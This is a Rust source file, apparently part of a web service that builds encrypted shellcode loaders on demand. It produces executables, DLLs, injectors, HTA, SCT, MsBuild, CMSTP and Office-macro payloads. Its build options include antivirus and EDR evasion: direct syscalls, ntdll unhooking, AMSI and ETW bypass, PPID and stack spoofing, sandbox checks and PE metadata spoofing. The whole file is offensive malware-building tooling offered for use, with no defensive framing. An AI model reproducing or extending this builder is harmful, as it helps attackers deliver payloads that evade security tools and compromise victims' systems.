use axum::{extract::State, http::StatusCode, response::Json};
use serde::{Deserialize, Serialize};
use std::path::PathBuf;
use tracing::error;
use crate::{
    builder::{
        job_store::{JobStatus, JobStore},
        pe_sign::PeMetadata,
        rustc_runner::compile_loader,
    },
    state::AppState,
};
use template_engine::{
    generate_loader_source, generate_script_source, generate_vba_source,
    generate_csharp_source, Encryption, Feature, LoaderConfig, LoaderType,
    OutputCategory,
};

#[derive(Deserialize)]
pub struct GenerateRequest {
    pub loader_type:   String,
    pub features:      Vec<String>,
    pub encryption:    String,
    pub shellcode_hex: String,
    pub key_hex:       String,
    pub iv_hex:        String,
    pub pe_config:     Option<PeMetadata>,
}

#[derive(Serialize)]
pub struct GenerateResponse {
    pub job_id: String,
}

pub async fn generate(
    State(state): State<AppState>,
    Json(req):    Json<GenerateRequest>,
) -> (StatusCode, Json<GenerateResponse>) {
    let job_id    = state.jobs.create_job();
    let job_clone = job_id.clone();
    let jobs      = state.jobs.clone();
    let cfg       = state.config.clone();

    tokio::task::spawn_blocking(move || {
        run_build(job_clone, req, jobs, cfg);
    });

    (StatusCode::ACCEPTED, Json(GenerateResponse { job_id }))
}

fn run_build(
    job_id: String,
    req:    GenerateRequest,
    jobs:   JobStore,
    cfg:    crate::config::Config,
) {
    let tx = match jobs.get_sender(&job_id) {
        Some(t) => t,
        None    => return,
    };

    jobs.set_status(&job_id, JobStatus::Building { progress: 5, msg: "Parsing config...".into() });

    let loader_type = match req.loader_type.as_str() {
        "Binary"      => LoaderType::Binary,
        "Dll"         => LoaderType::Dll,
        "AppDomain"   => LoaderType::AppDomain,
        "Injector"    => LoaderType::Injector,
        "Rundll32"    => LoaderType::Rundll32,
        "Wsf"         => LoaderType::Wsf,
        "Hta"         => LoaderType::Hta,
        "Regsvr32Sct" => LoaderType::Regsvr32Sct,
        "MsBuild"     => LoaderType::MsBuild,
        "Cmstp"       => LoaderType::Cmstp,
        "WmicXsl"     => LoaderType::WmicXsl,
        "DocxMacro"   => LoaderType::DocxMacro,
        "XlsxMacro"   => LoaderType::XlsxMacro,
        "InstallUtil" => LoaderType::InstallUtil,
        t => {
            jobs.set_status(&job_id, JobStatus::Error { msg: format!("unknown loader type: {}", t) });
            return;
        }
    };

    let features: Vec<Feature> = req.features.iter()
        .filter_map(|f| match f.as_str() {
            "DirectSyscall"    => Some(Feature::DirectSyscall),
            "UnhookDisk"       => Some(Feature::UnhookDisk),
            "UnhookKnownDlls"  => Some(Feature::UnhookKnownDlls),
            "ModuleStomp"      => Some(Feature::ModuleStomp),
            "SleepEncrypt"     => Some(Feature::SleepEncrypt),
            "StackSpoof"       => Some(Feature::StackSpoof),
            "SandboxDomain"    => Some(Feature::SandboxDomain),
            "SandboxUser"      => Some(Feature::SandboxUser),
            "PpidSpoof"        => Some(Feature::PpidSpoof),
            "AmsiHwbp"         => Some(Feature::AmsiHwbp),
            "EtwHwbp"          => Some(Feature::EtwHwbp),
            "PeSpoofing"       => Some(Feature::PeSpoofing),
            "Staged"           => Some(Feature::Staged),
            "AppDomain"        => Some(Feature::AppDomain),
            "ThreadlessInject" => Some(Feature::ThreadlessInject),
            _                  => None,
        }).collect();

    let encryption = match req.encryption.as_str() {
        "Aes256"   => Encryption::Aes256,
        "Chacha20" => Encryption::Chacha20,
        e => {
            jobs.set_status(&job_id, JobStatus::Error { msg: format!("unknown encryption: {}", e) });
            return;
        }
    };

    let loader_cfg = LoaderConfig {
        loader_type,
        features,
        encryption,
        shellcode_hex:    req.shellcode_hex.replace(' ', ""),
        key_hex:          req.key_hex.replace(' ', ""),
        iv_hex:           req.iv_hex.replace(' ', ""),
        pe_config:        None,
        appdomain_config: None,
    };

    jobs.set_status(&job_id, JobStatus::Building { progress: 10, msg: "Generating source...".into() });

    let job_dir = PathBuf::from(&cfg.artifacts_dir).join(&job_id);
    if let Err(e) = std::fs::create_dir_all(&job_dir) {
        jobs.set_status(&job_id, JobStatus::Error { msg: e.to_string() });
        return;
    }

    let category = loader_cfg.loader_type.category();
    let out_ext  = loader_cfg.loader_type.output_extension();
    let out_path = job_dir.join(format!("loader.{}", out_ext));

    match category {
        OutputCategory::PeCompiled => {
            let source = match generate_loader_source(&loader_cfg) {
                Ok(s)  => s,
                Err(e) => { jobs.set_status(&job_id, JobStatus::Error { msg: e }); return; }
            };
            let src_path = job_dir.join("loader_config.rs");
            if let Err(e) = std::fs::write(&src_path, &source) {
                jobs.set_status(&job_id, JobStatus::Error { msg: e.to_string() });
                return;
            }

            jobs.set_status(&job_id, JobStatus::Building { progress: 30, msg: "Compiling Rust source...".into() });

            let crate_type = match loader_cfg.loader_type {
                LoaderType::Binary | LoaderType::Injector => "bin",
                _                                          => "cdylib",
            };

            if let Err(e) = compile_loader(
                src_path.to_str().unwrap(),
                &cfg.scaffold_rlib,
                out_path.to_str().unwrap(),
                crate_type,
                &tx,
            ) {
                jobs.set_status(&job_id, JobStatus::Error { msg: e.to_string() });
                return;
            }

            // Apply PE metadata if requested
            if let Some(pe_meta) = &req.pe_config {
                if let Err(e) = crate::builder::pe_sign::apply_pe_metadata(
                    out_path.to_str().unwrap(), pe_meta, &tx,
                ) {
                    error!("PE metadata failed: {}", e);
                }
            }
        }
        OutputCategory::ScriptText => {
            jobs.set_status(&job_id, JobStatus::Building { progress: 60, msg: "Rendering script template...".into() });
            let source = match generate_script_source(&loader_cfg) {
                Ok(s)  => s,
                Err(e) => { jobs.set_status(&job_id, JobStatus::Error { msg: e }); return; }
            };
            if let Err(e) = std::fs::write(&out_path, &source) {
                jobs.set_status(&job_id, JobStatus::Error { msg: e.to_string() });
                return;
            }
        }
        OutputCategory::VbaText => {
            jobs.set_status(&job_id, JobStatus::Building { progress: 60, msg: "Rendering VBA macro source (copy-paste manually into Office)...".into() });
            let source = match generate_vba_source(&loader_cfg) {
                Ok(s)  => s,
                Err(e) => { jobs.set_status(&job_id, JobStatus::Error { msg: e }); return; }
            };
            if let Err(e) = std::fs::write(&out_path, &source) {
                jobs.set_status(&job_id, JobStatus::Error { msg: e.to_string() });
                return;
            }
        }
        OutputCategory::DotNetCompiled => {
            jobs.set_status(&job_id, JobStatus::Building { progress: 30, msg: "Generating C# source...".into() });
            let cs_source = match generate_csharp_source(&loader_cfg) {
                Ok(s)  => s,
                Err(e) => { jobs.set_status(&job_id, JobStatus::Error { msg: e }); return; }
            };
            let cs_path = job_dir.join("Loader.cs");
            if let Err(e) = std::fs::write(&cs_path, &cs_source) {
                jobs.set_status(&job_id, JobStatus::Error { msg: e.to_string() });
                return;
            }
            jobs.set_status(&job_id, JobStatus::Building { progress: 60, msg: "Compiling C# with csc.exe / mcs...".into() });
            if let Err(e) = crate::builder::csharp_runner::compile_csharp(
                cs_path.to_str().unwrap(),
                out_path.to_str().unwrap(),
            ) {
                jobs.set_status(&job_id, JobStatus::Error { msg: e });
                return;
            }
        }
    }

    let download_id = uuid::Uuid::new_v4().to_string();

    // Store download mapping: download_id -> artifact path
    let dl_link = PathBuf::from(&cfg.artifacts_dir).join(&download_id);
    let _ = std::fs::write(
        dl_link.with_extension("path"),
        out_path.to_str().unwrap(),
    );

    jobs.set_status(&job_id, JobStatus::Done { download_id });
}
